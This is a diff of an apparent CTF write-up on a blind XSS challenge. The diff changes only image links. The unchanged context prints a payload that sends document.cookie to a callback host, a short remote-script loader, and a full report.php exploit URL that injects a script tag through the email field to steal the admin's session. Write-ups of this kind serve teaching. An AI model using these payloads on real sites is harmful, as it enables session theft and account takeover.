@@ -19,16 +19,16 @@ This was a blind XSS challenge where the goal was to read the admin's cookie. Th
 * See your cookie.
 * Report a URL and an email.
 
-![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-1.png?raw=true "index.php")
+![XSS challenge](/assets/img/XSS-1.png "index.php")
 
 ## Initial Approach
 
 Since this was an XSS challenge, my initial idea was to exploit the cookie-saving functionality to inject an XSS payload and then send a link to the admin via the report page to steal their session. So, I created a cookie with a random name and an XSS payload via `index.php`, which got executed. However, I realized that `index.php` simply created a new cookie with the name and value specified, and the cookie view page (`cookies.php`) read our cookie and displayed it without sanitization. To steal the admin's cookie, I needed another XSS vulnerability.
 
-![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-2.png?raw=true "cookies.php")
+![XSS challenge](/assets/img/XSS-2.png "cookies.php")
 
 After careful inspection, I found that the report page (`report.php`) used `FILTER_VALIDATE_EMAIL` for the email field, which was vulnerable to XSS. I crafted a payload: `<script>document.location='http://interact-sh_url/?c='+document.cookie</script>`, but there was an error message saying "script tag is blocked" and there was a character limit as well. After some tinkering, I used `<script/src=//myserver/>`, which worked.
-![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-3.png?raw=true "report.php")
+![XSS challenge](/assets/img/XSS-3.png "report.php")
 
 ## HttpOnly Cookie Flag Bypass
 
@@ -77,8 +77,8 @@ Next, I created a JavaScript file that retrieved the admin's session and sent it
 ```
 
 
-![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-4.png?raw=true "Sending XSS payload to admin")
+![XSS challenge](/assets/img/XSS-4.png "Sending XSS payload to admin")
 
 So, I hosted this script on my server and sent a request to the report.php page with the following URL `http://host3.metaproblems.com:6020/report.php?report_url=http://google.com&report_email=%22%3CsCript/src=http://<myip>/3.js%3E%22@x.y` with a random email, and a few seconds later, I got the callback on my collaborator server with the flag.
 
-![XSS challenge](https://github.com/Jineeshak/jineeshak.github.io/blob/main/assets/img/XSS-5.png?raw=true "Sending XSS payload to admin")
+![XSS challenge](/assets/img/XSS-5.png "Sending XSS payload to admin")
